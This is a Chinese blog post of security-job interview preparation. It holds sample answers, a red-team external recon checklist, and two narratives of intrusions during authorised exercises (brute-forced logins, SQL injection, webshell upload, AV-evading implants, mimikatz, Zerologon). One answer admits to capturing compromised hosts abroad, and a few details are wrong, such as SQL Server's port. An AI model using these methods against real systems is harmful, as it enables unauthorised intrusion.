Wireshark.</p><ol start="4"><li>自我介绍<br>你好，我是xx，一名来自xx大学xx专业的xx学生，很高兴参加今天的面试。我将通过几个特性来展开介绍自己：<br>第一，勇于尝试。我在护网中做过蓝队的安全监控，红队的外围打点。这个特性能让我在公司安排了任务的时候勇敢参与积极尝试。<br>第二，敏锐机智。我能抓住一些别人没有意识到的机会。我在看油管节目发现很多人想付油管频道会员却没有支付手段，于是我做了中间商代客户购买会员，第一个月赚了3万元。我认为这个特性能够帮助我在工作中找到独特的解决方案，从而降低项目所需的时间与成本。<br>第三，耐心坚持。这个特性我是在大学的炒币中学会的，也在我之后的经历中不断起作用：我第一次搭建博客的时候没有任何经验掉进了一个又一个坑。很多时候要从头开始但我每次都坚持过来了。我认为这个特性能够让我即使不断失败最终也能完成艰巨的任务。<br>第四，热情洋溢。我认为一件事在有激情的情况下能做得更好。我能够坐在电脑前连续8小时研究一个东西不起身，有时也会忘记吃饭和睡觉。我认为这个特性能够给整个团队带来积极氛围，帮助在工作中迅速高质量地完成任务。</li></ol><p>English Self Introduction:</p><p>Hello, I am xx, a 年级 student majoring in 专业 at 学校. I am delighted to participate in today’s interview, and I would like to introduce myself based on several key characteristics:</p><p>First, I am willing to take on challenges. I have experience in both blue team security monitoring and red team penetration testing in cybersecurity. This characteristic allows me to actively engage in tasks assigned by the company and fearlessly try new approaches.</p><p>Second, I possess keen wit and resourcefulness. I have a knack for identifying opportunities that others may not notice. For instance, I observed that many people wanted to subscribe to YouTube channels but lacked the means to pay, so I acted as an intermediary to purchase memberships on their behalf. In the first month, I earned 30,000 RMB. I believe this quality can help me find unique solutions in my work, reducing the time and cost required for projects.</p><p>Third, I am patient and persistent. I developed this trait during my university years while trading cryptocurrencies, and it has continued to serve me in subsequent experiences. When I first attempted to create a blog without any prior experience, I encountered numerous challenges. Often, I had to start over, but I always persevered. I believe this characteristic enables me to complete challenging tasks even in the face of repeated failures.</p><p>Fourth, I am enthusiastic and passionate. I believe that passion enhances one’s performance. I can sit in front of a computer for up to 8 hours continuously researching a topic without getting up, sometimes even forgetting to eat and sleep. I think this characteristic can contribute to creating a positive atmosphere within the team and help us efficiently and effectively accomplish tasks in the workplace.</p><ol start="5"><li>hw经历</li></ol><p>2021年国护蓝队初级。<br>2022年国护红队初级。<br>2023年国护红队初级。</p><ol start="6"><li>对红蓝对抗的看法</li></ol><p>攻防趋势演变越来越激烈。红队普遍要比蓝队强大。<br>红队的工作已经变得非常体系化、职业化和工具化<br>1） 体系化<br>从漏洞准备、工具准备，到情报收集、内网渗透等，每个人都有明确的分工，有组织地形成团队作战能力，已经很少有一个人干全套的情况了。<br>2） 职业化<br>红队人员都来自各组织专职实战演习团队，有明确分工和职责，具备协同配合的职业操守，平时开展专业化训练。<br>3） 工具化<br>工具化程序持续提升，除了使用常用渗透工具，基于开源代码的定制化工具应用增多，自动化攻击被大规模应用，如采用多IP出口的自动化攻击平台进行作业。</p><p>从实战对抗的手法来看，现如今的红队还呈现出社工化、强对抗和迂回攻击的特点。<br>1） 社工化<br>利用“人”的弱点实施社会工程学攻击，是黑产团伙和高级威胁组织的常用手段，如今也被大量引入实战攻防演习当中。<br>除了钓鱼、水坑等传统社工攻击手段外，如今的红队还会经常通过在线客服、私信好友等多种交互平台进行社工攻击，以便更加高效地获取业务信息。社工手段的多变性往往会让防守方防不胜防。<br>2） 强对抗<br>利用0Day漏洞、NDay漏洞、免杀技术等方式与防守方进行高强度的技术对抗，也是近1-2年来红队在实战攻防演习中表现出的明显特点。特别的，红队人员大多出自安全机构，经过专业训练，因此往往会比民间黑客更加了解安全软件的防护机制和安全系统的运行原理，其使用的对抗技术也往往更具针对性。<br>3） 迂回攻击<br>对于防护严密，有效监控的目标系统来说，正面攻击往往难以奏效。这就迫使红队越来越多的采用“曲线救国”的攻击方式，将战线拉长：从目标系统的同级单位和下级单位入手，从供应链及业务合作方下手，在防护相对薄弱的关联机构中寻找突破点，通过迂回攻击的方式攻破目标系统。<br><a href="https://cn-sec.com/archives/366788.html">红队浅析一</a></p><ol start="7"><li>你觉得什么是你自己比较擅长的而我没有问到的？</li></ol><p>擅长绕waf</p><ol start="8"><li>针对web扫描器的爬虫，你怎么看？</li></ol><p>Web 漏扫的爬虫和其他的网络爬虫的技术挑战不太一样，漏扫的爬虫不仅仅需要爬取网页内容、分析链接信息，还需要尽可能多的触发网页上的各种事件，以便获取更多的有效链接信息。</p><ol start="9"><li>企业内部安全</li></ol><p>内部安全通常比较薄弱，最大的问题尤其是管理人员的疏忽。</p><ol start="10"><li>怎么判断目前是否是cms？</li></ol><p>(1) 查看网页源代码，查找CMS系统的标识符。如：WordPress的标识符是wp-content, wp-includes；DedeCMS的标识符是dedeajax, uploadsalling；Discuz：uchome、uc_server<br>(2) 访问robots.txt文件，可以查看CMS系统禁止访问的文件或目录。如：WordPress禁止访问的文件或目录包括wp-admin、wp-includes、wp-content等<br>(3) 使用CMS识别工具。在线CMS识别工具：Wappalyzer, WhatCMS；命令行CMS识别工具：cmsdetect；脚本CMS识别工具：cmsdetect.py。<br>(4) 尝试登录后台。在网站网址后面加上 <code>**/admin  或  /login**</code> 等后缀，如果可以访问到CMS系统的后台，则可判断该网站使用了CMS。<br>(5) URL 结构：使用了 CMS 的网站，其 URL 结构通常包含标识符，例如 “&#x2F;category” 或 “&#x2F;tag” 等。</p><ol start="11"><li>做过黑产吗？</li></ol><p>没</p><ol start="12"><li>以后的发展？</li></ol><p>首先是大致精通web安全，然后再将web安全与AI结合起来。因为以后必然是AI的时代。</p><ol start="13"><li>多久能学会？</li></ol><p>不敢说什么东西多久能学会，但会尽力去学，用空闲时间研究学习。</p><ol start="14"><li>说说你以前在你公司主要做什么安全工作？如每天，每月，每年做些什么安全工作？</li></ol><p>渗透测试。</p><ol start="15"><li>你写过什么好的安全漏洞文章发布过吗？是否可以说说？</li></ol><p>没有。</p><ol start="16"><li>说说你的其它优势（如：对安全新兴技术的研究、个人博客、比赛、在校经历等）</li></ol><p>我在校期间做过家教，炒股，炒币，代付等赚钱方式，这些经历能够使我拥有更开阔的视野。</p><ol start="17"><li>说说大学这几年最自豪的事情</li></ol><p>一个月赚了3万元。</p><ol start="18"><li>CTF你都做过哪些题型？</li></ol><p>web安全的各种题型基本都有涉及。SQL注入，文件上传，文件包含，CSRF，SSRF，爆破，RCE，反序列化，XXE，SSTI，XSS。PHP。</p><ol start="19"><li>遇到的比较困难的web题型的ctf题目</li></ol><p>ctfshow的命令执行 web40<br>ctfshow的PHP web133</p><ol start="20"><li>假如让你设计一个waf，你会怎么设计？</li></ol><p>不知道，兼容性好的。<br><a href="https://cloud.tencent.com/developer/article/1043131">互联网公司WAF系统设计</a></p><ol start="21"><li>有没有写过一些脚本？</li></ol><p>写过。主要是python脚本，抓取信息，下载。爬虫。<br><a href="https://www.freebuf.com/vuls/281949.html">渗透测试之特殊需求的图形验证码识别脚本快速开发</a><br><a href="https://blog.csdn.net/isluckyboy/article/details/116768239">用python写渗透测试脚本</a><br><a href="https://www.gingerdoc.com/python_penetration_testing/python_penetration_testing_quick_guide">Python 渗透测试</a><br><a href="https://cloud.tencent.com/developer/article/1441816">聊一聊渗透测试过程中的脚本功能</a></p><ol start="22"><li>为什么做这一行？</li></ol><p>喜欢。向往。有趣。</p><ol start="23"><li>是否有在国外抓过肉鸡，有没有做黑产的朋友</li></ol><p>有。<br><a href="https://cloud.tencent.com/developer/article/2245714">抓肉鸡的几种方法</a></p><ol start="24"><li>是否能接受驻场？</li></ol><p>驻场就是不在公司工作,而是去公司指定的别的地方工作,而且几乎是长期在外。<br><a href="https://www.freebuf.com/articles/security-management/243980.html">安全驻场工程师的自我救赎之路</a><br>无论是在本公司工作还是驻场，都不是最重要的。关键在于能否学到东西。我希望进公司后能够学习到更多东西，掌握理论知识，提高实践能力。不仅仅是做着简单的事务，而是为公司能够有更多的贡献。为公司的发展添砖加瓦。</p><ol start="25"><li>都破解过哪些软件？如果给你一个产品，你能提出安全加固建议吗？</li></ol><p>拷贝漫画。<br><a href="https://developer.aliyun.com/article/297988">破解apk</a><br><a href="https://github.com/jjz/blog/blob/master/android/Apk%E5%8C%85%E7%9A%84%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91.md">APK包的破解与反编译</a><br><strong>安全加固</strong>：<br>源码加固：<br>Java源码加固-dex文件加壳保护、dex函数抽取加密；<br>SO库加固-SO文件加壳保护、高级深度混淆、ELF数据隐藏；<br>Html加固；<br>资源文件加固-音视频加密、配置文件和数据库加密；</p><p>运行环境加固：<br>完整性保护-签名、防二次打包；<br>防调试保护-双向ptrace保护、反IDAPro调试；<br>防篡改保护-防数据破解分析、防数据劫持；<br>反编译保护-反apktool、反ApkIDE、反jd-gui；<br>模拟器识别；<br>ROOT检测；</p><p>业务场景加固：<br>密钥保护；<br>安全键盘；<br>防界面劫持；<br>反外挂；<br>清场；<br>通信协议加密；</p><p><a href="https://zhuanlan.zhihu.com/p/473745398">App安全加固</a></p><ol start="26"><li><p>你有什么想问的吗？<br>我想知道：<br>公司发展的长期目标和短期目标是什么？<br>管理人员和技术人员的占比是多少？管理人员懂安全吗？<br>公司对AI的发展有什么看法或想法？<br>公司对员工的能力提升方面会有哪些方式措施？</p></li><li><p>你怎么理解安全服务工程师这个岗位？<br>安服是网络安全中入门和比较综合型的岗位，主要的职责偏向安全事件，负责各类安全事件的分析跟踪,提供应对措施和提供应急建议。针对于碰到的各类安全事件进行应急响应,安全事件的处理与溯源；当然在工作当中也会涉及到解决网络环境中的技术问题，针对安全项目而言需要负责项目的安全风险评估与安全技术支持工作；如果在乙方公司工作，通常会涉及到对甲方公司提供一些安全产品以及安全方案。</p></li></ol><p><strong>护网</strong></p><p>针对面试可能问到的护网问题进行总结：</p><ol><li><pre><code>中国电信广东分公司 安全监控  2021.4.8-2021.4.21</code></pre>1.1 地址：广东省广东市海珠区南贤大街51号</li></ol><p>1.2 护网流程：<br>备战期：<br>记得当时是提前2天进场，公司做了简单培训，明确了责任分工。<br>之后我们对资产梳理扫描，做一个简单的内部测试渗透。每人分配一两个IP地址，去做渗透工作。<br>首先用nmap 扫描全端口，共享资产列表，互相补充。<br>关闭不再用的业务系统；关闭重要系统外网访问通道，通过VPN进行业务操作。<br>对梳理好的资产进行弱口令扫描，漏洞扫描，渗透测试，基线检查。有问题及时整改加固，然后复测。<br>之后再用Nessus扫描，生成报告，将这个报告与之前的报告对比，看看有没有共同点，报告里的漏洞分了初中高级。<br>接下来就是漏洞复现，能够复现成功的就写报告提交给甲方。</p><p>1.3内部攻防演练<br>发现备战期忽略遗漏的地方，并进行整改。<br>侧重于web漏洞而较少关注中间件漏洞，导致被攻击方攻破。<br>VPN的用户名和密码仅仅经过了简单编码base64存储在app中，被攻击方发现直接进入内网。<br>改正：针对中间件更新补丁，删除被利用的war包。用户名密码泄露问题不写死在app中，并通过验证码登录，将app混淆，防止反编译。</p><p>1.4安全设备<br>安全狗，WAF，入侵检测系统IDS，入侵防御系统IPS。漏洞扫描器，DDOS防护，监控设备：SOC安全运营中心（奇安信NGSOC）。<br>1.5开战期<br>排班制，来了后先和前面的人交接一下，然后开始看监控，10个人一起，项目经理给分，我当时看的是奇安信的，发现异常的时候有个工单，工单系统把来源IP与目标ip写上，然后把日志贴上去就行。<br>IP能封几万条。<br>1.6工作职责<br>主要就是看设备报警，发现危险IP，判断是否为一个安全事件，如果是就决定封锁。看安全厂商的安全设备，比如态势感知，用的是奇安信的NGSOC，还有他们那个全流量分析天眼，IDS，IPS，内网蜜罐系统。如果说态势感知放在外网，就针对外网下的流量进行监控，流量扫描这些。<br>1.7其它<br>11<br>11<br>2.安恒信息公司 外围打点 2022.7.26-2022.8.9，2023.8.9-2022.8.23<br>2.1 打点的基本认识<br>所谓打点，就是拿一台机器的shell。打点的目的一般在于利用这台机器作为跳板进入内网。<br>2.2 打点的基本方法<br>流程：靶标确认—信息收集—漏洞探测—漏洞利用—权限获取<br>2.3靶标确认<br>确认攻击范围，防止攻击打偏的情况，例如IP段，子域名等域名信息。<br>2.4信息收集<br>包括域名备案信息，真实IP，端口开放情况，网站目录结构，防护设备信息等。<br>2.5漏洞探测<br>根据信息收集的情况找到合适的漏洞poc进行测试，也可使用漏洞扫描器全方位漏洞探测。<br>2.6漏洞利用<br>Poc测试完成后，确认漏洞，使用exp攻击获取部分权限，如数据库权限，webshell权限等<br>2.7权限维持与提升<br>获取到基础权限之后，可通过认证绕过、溢出漏洞等本地提权方式获取靶标的最高权限(如管理员权限，系统权限等)<br>2.8横向移动<br>获取靶标最高权限，可尝试获取靶标所在内网中的其它机器的权限<br>2.9信息收集步骤<br>(1)得到攻击目标(假设公司)，通过企查查搜索，得到公司和子公司信息。<br>(2)通过公司和子公司信息，用oneforall得到子域名。<br>(3)将子域名拿到Eeyes(棱眼)跑一遍，得到子域名所对应的IP和C段信息。（C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。）<br>(4)将对应IP和C段丢给fofa和fscan，fofa能快速得到C段资产信息；fscan能快速扫一遍，顺便打一下常见漏洞。（Fofa 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配。 例如进行漏洞影响范围分析、应用分布统计、应用流行度等。 在渗透测试过程中，Fofa能帮助测试人员快速发现目标资产。）（Fscan是一款内网综合扫描工具，它非常的方便，一键启动，之后完全自动化、并且全方位漏洞扫描。 它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。）<br>(5)如果fscan爆出漏洞可拿去利用（小概率）<br>(6)查看通过fofa得到的资产，可配合ehole的指纹识别来快速筛选。通过筛选敏感资产（如shiro, fastjson等）直接能够反序列化getshell的资产（小概率）。（EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。 EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。）<br>(7)获得了登陆后台&#x2F;用户登录&#x2F;注册&#x2F;管理员等交互类型的资产后，可以尝试进行反序列化漏洞&#x2F;文件上传漏洞&#x2F;SQL注入等漏洞。<br>(8)对各种登录系统尝试弱口令&#x2F;SQL注入攻击，弱口令能登入后台就找上传点，SQL注入建议xray+burp检测，有戏再用sqlmap。fofa搜关键字，title&#x3D;”单位名”等，可自行穿插灵活使用，有时有效。弱口令登云桌面(horizen,vdi等)拿到shell的方式可尝试（小概率）。<br>(9)弱口令如果爆不出账号密码，考虑上 网盘&#x2F;GitHub&#x2F;社工库&#x2F;泄露公开库 搜对应人员信息，看是否有效。<br>(10)若无用，则查看 公众号&#x2F;app&#x2F;小程序 的信息。<br>(11)若无用，开始使用 域传送&#x2F;备案号&#x2F;IP反查网站&#x2F;ssl证书&#x2F;Google 来搜C段。<br>(12)若无用，使用 dirmap&#x2F;dirsearch 对可疑网站进行目录爆破。<br>(13)若无用，发钓鱼邮件。（网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达5%的人都会对这些骗局做出响应 。）<br>(14)若无用，申请近源渗透。（近源渗透通俗而言就是通过乔装、社工等方式实地物理侵入企业办公区域，通过其内部各种潜在攻击面（如Wi-Fi网络、RFID门禁、暴露的有线网口、USB接口等）获得“战果”，最后以隐秘的方式将评估结果带出上报，由此证明企业安全防护存在漏洞。）</p><p><a href="https://xz.aliyun.com/t/11300">记首次HW|某地级市攻防演练红队渗透总结</a><br><a href="https://xz.aliyun.com/t/11366">记一次艰难的外网打点</a><br><a href="https://xz.aliyun.com/t/12827">记一次地级市攻防3W分</a></p><p>2.10Fofa在外网打点中的小技巧<br>后台挖掘： <code>title=”后台” &amp;&amp; body=”password” &amp;&amp; host=”x.cn”</code><br>子域名： <code>title != ‘404’ &amp;&amp; title!=’302’ &amp;&amp; host=’x.cn’</code><br>C段： <code>ip=’x.x.x.x/24’ &amp;&amp; host=’x.cn’</code><br>框架特征： <code>body=’icon-spring-boot-admin.svg’</code>  或  F12找到js链接，fofa搜索: <code>&quot;/Public/home/css/animate.min.css&quot;</code><br>漏洞： <code>body=’index/of’ [列目录漏洞]</code><br>真实IP探测： title搜IP与目标网站有关的；然后选择一个结果，查找该网站证书，将证书序列号(Serial Number)转为10进制，用fofa搜证书：  <code>cert=&quot;xxxx&quot;</code><br><a href="https://www.cnblogs.com/sunny11/p/14388508.html">Fofa搜索技巧</a></p><p>2023攻防演练于8月9日9:00正式开始！ </p><ol><li>目前情报了解到的攻击方禁止事项：</li></ol><ul><li>攻击方禁止采用任何近源攻击方式进行攻击</li><li>攻击方禁止非演练时间攻击：演练前（8月9日前）、21:00～9:00次日（当前）</li><li>攻击方禁止复用小HVV成果（部分客户前期有小HVV）</li></ul><ol start="2"><li>关于一些变化：弱化了溯源到攻击人员的成果需求、弱化了提交漏洞的成果需求 </li><li>HVV期间可以注意的事情：</li></ol><ul><li>钓鱼邮件防范：警惕公司公网和内网邮箱收到的邮件的发件人邮箱、链接中的地址域名真实性，附件后缀以及极具诱惑力的邮件主题，同时不要轻易打开或放行已打警示标记的邮件和隔离邮件摘要中的邮件。</li><li>电话短信防范：警惕不详或无法提供识别信息的，伪装成客户或商务机会，且诱导提供公司敏感信息，或诱导安装指定软件的行为。</li><li>可疑简历防范：避免接收应聘者通过即时通讯软件或邮箱直接发来的简历，打开简历前务必确认文件后缀，不打开非 doc&#x2F;docx&#x2F;PDF 后缀的简历文件。</li><li>物理攻击防范：警惕办公区内外的长期逗留、尝试溜门或获取无线密码等行为的可疑人员。</li><li>即时通讯防范：警惕一切以HVV名义，通过微信、QQ 或其他具有聊天功能的软件添加好友，或发送文件的行为，避免社会工程学攻击。</li><li>水坑攻击防范：警惕任何网站、公众号、微信群中发布的一切无法确认是官方来源的，以 HVV 0DAY&#x2F;POC&#x2F;补丁&#x2F;检测工具&#x2F;厂商情报为噱头的文件或链接。</li><li>避免协助社工：警惕以查IP归属、查员工电话、从电话查员工等可能与溯源或社工行为相关的外部请求，此类信息一律反馈发展计划部，由发展计划部判断后给出。 </li><li>清点加固名下资产：明晰自己名下的设备、测试机等内网网络资产，提前打补丁、改密码和隔离，对于办公机和业务服务器安装终端防护；公网IP、公用邮箱、域名等外部攻击面，关闭演练期间不必要的服务，杜绝弱密码、未授权和Nday漏洞。</li><li>样本安全发送：禁止在即时通讯和邮件直接发送恶意样本，请加密压缩或破坏后缀格式后发送，避免误点击中招或邮件网关误拦截。</li></ul><p><strong>一次完整的外围打点（信息泄露）：</strong><br>锁定目标后，首先进行信息收集，收集到子域名时，发现了一个sso，网站title是“某某单点登录系统”，登录的验证码只要不刷新就不会改变，所以直接丢到burp里去爆破。通过弱口令成功爆破出了十几个能用的账号。<br>进入了系统后，查看是否能够getshell。其中一个模块可以上传头像，但是检测很严格无法成功利用。其它地方就暂时没有发现利用机会了。<br>于是改变思路，在之前的子域名爆破中，发现了一个app。在虚拟机安装了安卓版本的app后，发现也可使用单点登录系统来登录。<br>登进去后会显示自己的身份信息（比如工号、部门、职业等）。然后抓包，没发现有什么漏洞。<br>接下来通过之前扫出的一个名叫“能力提升系统”的子域名登录进入。打开源码然后去GitHub搜索，找到了泄露的信息，一些配置敏感信息。<br>简单审计了一下，发现该系统需要权限才能显示更多信息，于是找到之前爆出的一个比较高权限的账号某主管登入。<br>登入系统后测了几个接口发现其中一个存在SQL注入。然后拿到sqlmap里爆，结果发现是个postgreSQL爆出了几个数据库。发现了数据库里明文存储的敏感信息。<br>接下来为了进入内网，需要找到有VPN权限的人。翻了下看到了个岗位较高的it岗的信息，尝试登入vpn或邮箱，失败。于是猜测是不是改了密码，加了特殊字符之类的。于是在之前的旧密码基础上添加了特殊字符尝试。试了几十次后成功登录邮箱，vpn还是失败，新密码就是原密码后面加了个!<br>然后翻找公司邮件，发现了vpn密码。成功登入vpn，进入内网。<br>进入内网后扫描常见漏洞发现有公网的redis，可以出网，把这台当作后续攻击的跳板，后续发现了Zero logon漏洞。使用工具成功拿下。</p><p><strong>一次完整的外围打点（免杀）：</strong><br>根据所给的目标，先收集信息，发现了一个登录口。通过测试发现存在未授权访问，允许未授权查看，添加，编辑和删除。通过未授权访问用户修改界面（uid&#x3D;1），可以看到密码已填充，以*号显示，通过前端将passwd修改为text，密码成功显示，登录成功。<br>进入界面发现有一个上传头像功能，直接上传个图片马，burp抓包将后缀改为asp成功绕过，然后通过目录遍历漏洞找到文件上传路径，通过上传时间可知木马文件是哪个。最后用蚁剑连接成功。<br>进入内网后，通过信息收集发现了winserver2012 R2的服务器，执行 <code>tasklist /svc</code> 查看当前主机上运行的进程，将结果拷贝到在线杀软平台进行比对，发现装了360。然后用分离免杀马CS上线，反弹成功。<br>接下来提权，还是拿到一台winserver2012 R2的服务器，尝试了提权插件和烂土豆都提权失败，因为条件不满足。<br>之后通过信息收集到数据库配置文件，数据库在另一台外网服务器（阿里云）上，使用navicat连接成功。接下来使用xp_cmdshell提权，拿到system权限。因为system权限在数据库中，为了方便接下来的渗透，计划将system权限上线到CS上，将免杀马传入显示执行成功但未上线。估计是由于阿里云ECS对出站端口作了限制，反弹不回来。<br>于是换了个思路，通过system权限创建管理员用户，用3389远程桌面连接，再利用procdump+mimkatz获取到Administrator账户的明文密码（问2008）。<br>最终完全控制了这台云服务器。</p><p>曲折的渗透经历：<br>为了探究为什么执行木马的命令提示成功了，但shell却没反弹回来的真正原因，在图形化下的 cmd窗口执行木马，惊人发现：提示缺少了某140D.dll，这才恍然大悟，这情况去年做python免杀实验时也遇到过，原来这是生成exe文件时的配置问题，当我们生成Release版本的时候，运行库选择MT；当生成Debug版本时，运行库选择MTD。 不然的话就会造成在自己电脑上执行没问题，但在其他电脑上执行可能会提示缺少dll文件。于是重新生成了木马，再次在Navicat里执行，它居然上线了！</p><p><a href="https://tttang.com/archive/1888/">近源渗透</a></p><p>感兴趣的安全证书：<br>1、CISSP：信息系统安全认证专家是一个独立的信息安全认证，认证由国际信息系统安全认证联盟颁发，即(ISC)²。<br>2、CISA：注册信息系统审计师资格是由信息系统审计与控制协会授予的关于信息系统审计、信息安全和信息系统控制相关的知识及技能的国际认证。要通过此项认证需通过ISACA组织的考试。<br>3、OSCP：Offensive Security认证专家，是Offensive Security提供的一项道德黑客认证，它教授渗透测试方法和Kali Linux发行版中所包含工具的使用方法。OSCP是一项实践的渗透测试认证，要求持有者在安全的实验室环境中成功攻击和渗透各种实时机器。</p><p>绿盟一面问题-安全服务工程师-35min：<br>1、自我.介绍<br>2、为什么选择绿盟？(这个没回答好直接挂)<br>3、为什么参数化查询可以防止SQL注入？<br>4、webshell检测方式<br>5、渗透测试流程<br>6、域内横向？<br>7、如何防止命令注入？<br>8、命令注入原理<br>9、shiro漏洞原理<br>10、nmap有了解吗？问了一些参数的作用。<br>11、sqlmap有了解吗？问了一些参数的作用。<br>12、客户那边出现了挖矿病毒怎么办？<br>13、根据之前面试的情况，评价一下你自己擅长的方面？<br>14、职业规划<br>15、讲讲家庭情况<br>16、讲讲目标薪资<br>17、你有什么想问我的吗？</p><p><a href="https://www.nowcoder.com/discuss/353158641375191040">绿盟安全服务二面</a></p><p>你为什么想加入德勤？<br>1、德勤（Deloitte）是世界四大会计师事务所之一。高平台有助于提高个人眼界帮助发展。<br>2、工作地点在重庆，离我的家乡比较近。</p><p>描述一个你工作&#x2F;学习中承受压力的经历，怎么处理的？ Describe a time in your work or study when you experience stress, what about the situation give you stress? How did you deal with it?</p><p>One time, I was asked to create a bot that could repost Bilibili updates on QQ within a 7-day deadline. I didn’t have much knowledge in this area at the time, and the pressure was intense. However, I managed to complete the project through continuous online research and seeking guidance from experienced individuals, despite facing repeated failures along the way.</p><p>做错&#x2F;得到负面反馈的事，怎么解决的？ Describe a time when you made a mistake or when you did not apply the necessary effort in a task or project. What feedback did you receive? How did you change your approach as a result of this?</p><p>First, I would review the entire incident to identify the root causes of the failure.<br>Then, I would compile a list of solutions to address the issues and ensure that I don’t make the same mistakes again.</p><p>德勤GPC一面问题-网络安全运营工程师-20min：<br>1、自我介绍<br>2、有趣的渗透经历<br>3、应急响应<br>4、你有参加过CTF之类的比赛吗？讲讲<br>5、CSRF与XSS结合有什么利用方式<br>6、SSRF的成因，SSRF的利用方式<br>7、对安全运营的理解<br>8、如果你是投资人，会关注安全运营中心的哪些方面。我回答了整体的逻辑流程，继续提问具体有哪些方面<br>9、你的英语怎么样？<br>10、你有什么想问我的吗<br>11、期望薪资</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;自身方面的提问是对综合素质的考察。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="自身方面" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之计算机基础篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-25T15:33:16.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>地基。</p><span id="more"></span><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ol><li>什么是同源策略？</li></ol><p>源就是主机、协议、端口名的一个三元组。<br>同源策略(Same Origin Policy,SOP)是web应用程序的一种安全模型，被广泛地应用在处理web内容地各种客户端上，比如各大浏览器，Microsoft的Silverlight，Adobe的Flash&#x2F;Acrobat等等。同源策略限制不同源对当前document属性内容进行读取或设置。</p><ol start="2"><li>如何使得前端 referer 为空</li></ol><p>通过地址栏输入，书签里面选择或浏览器的插件BurpSuite修改。</p><ol start="3"><li>cookie参数，secure是干什么的？</li></ol><p>expire: 可选的有效期参数，设置cookie变量保存时间。第一种是写入 session ，在浏览器会话期间有效，关闭浏览器则失效。另一种是需要把 date 对象转换成字符串再写入 cookie。<br>HttpOnly: 只有在http请求下才可使用，防止cookie被xss偷<br>https: 防止cookie在网络中被偷<br>Secure: 只有在https的请求下才可使用，阻止cookie在非https下传输<br>Path: 指定的某个路径这个 cookie 才能使用，这里的一般直接就是设置成 <code>\</code> ，当前目录下都可使用，因为只要是当前域下的，其实都可以使用。区分cookie的标识，安全上作用不大，和浏览器同源冲突</p><ol start="4"><li>cookie的P3P性质</li></ol><p>http响应头的P3P(Platform for Privacy Preferences Project)字段是W3C公布的一项隐私保护推荐标准，该字段用于标识是否允许<strong>目标网站的cookie</strong>被<strong>另一个域</strong>通过加载目标网站而设置或发送，仅IE执行了该策略。<br>将情形分为两类，分别是设置与发送：<br>（1）设置cookie。在IE下默认是不允许第三方域设置的，除非foo域在响应的时候带上P3P字段，这样设置后，被加载的目标域的cookie就可以被正常设置了。<br>（2）发送cookie。如果是内存cookie，无所谓是否有P3P属性，就可以正常发送；如果是本地cookie，则这个cookie必须拥有P3P属性。</p><ol start="5"><li>常见的网站服务器容器</li></ol><p>(1) Apache: 目前Apache仍然是世界上用得最多的Web服务器，市场占有率约为60%左右。源代码开放、有一支强大的开发团队、支持跨平台的应用（可以运行在几乎所有的Unix、Windows、Linux系统平台上）以及它的可移植性等方面。<br>(2) IIS: Microsoft的Web服务器产品为Internet Information Services。IIS 是允许在公共Intranet或Internet上发布信息的Web服务器。<br>(3) Nginx: 读作”engine x”，是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP代理服务器。<br>(4) Tomcat: Tomcat是一个开放源代码、运行Servlet和JSP的容器。TomcatServer实现了Servlet和JSP规范。<br>(5) WebLogic: BEA WebLogic Server是一种多功能、基于标准的Web应用服务器，为企业构建自己的应用提供了坚实的基础。<br>(6) WebSphere: WebSphere Application Server是功能完善、开放的Web应用程序服务器，是IBM电子商务计划的核心部分，它是基于Java的应用环境，用于建立、部署和管理Internet和Intranet Web应用程序，适应各种Web应用程序服务器的需要，范围从简单到高级直到企业级。<br>(7) Kangle: Kangle Web服务器是一款跨平台、功能强大、安全稳定、易操作的高性能Web服务器和反向代理服务器软件。此外，Kangle也是一款专为做虚拟主机研发的Web服务器。</p><ol start="6"><li>@ 3306，1443，8080是什么端口？</li></ol><p>3306: MySQL<br>1443: SQL Server<br>8080: 代理端口</p><ol start="7"><li>@ 计算机网络从物理层到应用层xxxx</li></ol><p>物理层，链路层，网络层，传输层，应用层</p><ol 